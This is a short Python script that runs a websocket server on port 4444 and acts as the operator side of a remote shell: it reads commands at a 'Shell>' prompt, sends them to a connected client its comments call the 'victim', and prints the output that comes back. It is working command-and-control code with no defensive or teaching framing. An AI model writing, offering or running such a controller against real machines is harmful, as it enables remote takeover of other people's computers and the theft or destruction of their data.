import asyncio
import websockets

async def handler(websocket):
    print("Client Connected")
    try:
        while True:
            cmd = input("Shell> ")  # Take command input
            await websocket.send(cmd)  # Send command to victim
            result = await websocket.recv()  # Receive output from victim
            print(result)
    except websockets.exceptions.ConnectionClosed:
        print("Client disconnected")

async def main():
    async with websockets.serve(handler, "0.0.0.0", 4444):
        await asyncio.Future()  # Keeps the server running indefinitely

asyncio.run(main())
